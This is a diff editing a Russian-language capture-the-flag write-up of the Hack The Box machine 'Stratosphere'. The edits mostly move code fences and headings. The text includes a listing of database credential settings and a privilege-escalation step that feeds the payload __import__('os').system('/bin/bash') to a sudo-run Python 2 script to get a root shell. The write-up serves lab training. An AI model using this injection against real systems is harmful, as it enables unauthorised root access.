@@ -525,7 +525,9 @@ logs:       symbolic link to ../../log/tomcat8
 policy:     directory
 webapps:    directory
 work:       symbolic link to ../../cache/tomcat8
+```
 
+```text
 stratosphere> cat db_connect
 [ssn]
 user=ssn_admin
@@ -702,16 +704,21 @@ lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m -> python3.5m
 
 [Известно](https://docs.python.org/2/library/functions.html#input "2. Built-in Functions — Python 2.7.15 documentation"), что в Python 2 функция `input()` эквивалентна такой конструкции: `eval(raw_input())`. Поэтому запуск `test.py` с помощью Python 2 позволит пользователю выполнять системные команды, в данном случае от имени рута, чем мы собственно и займемся.
 
-### root.txt
 В [этом](https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html "Vipul Chaskar's Blog: Exploiting eval() function in Python") посте хорошо описан механизм эксплуатации функции `eval()` для Пайтона, а я же просто ~~поимею~~ получу root-сессию:
 ```text
 richard@stratosphere:~$ sudo /usr/bin/python2 ~/test.py
 Solve: 5af003e100c80923ec04d65933d382cb
 __import__('os').system('/bin/bash')
+
 root@stratosphere:/home/richard# whoami
 root
+
 root@stratosphere:/home/richard# id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+### root.txt
+```text
 root@stratosphere:/home/richard# cat /root/root.txt
 d41d8cd9????????????????????????
 ```
@@ -744,7 +751,6 @@ richard@stratosphere:~$ ls -l *.py
 -rwxr-x--- 1 root    richard 1507 Mar 19 15:23 test.py
 ```
 
-### root.txt
 И со спокойной совестью запустим скрипт:
 ```text
 richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
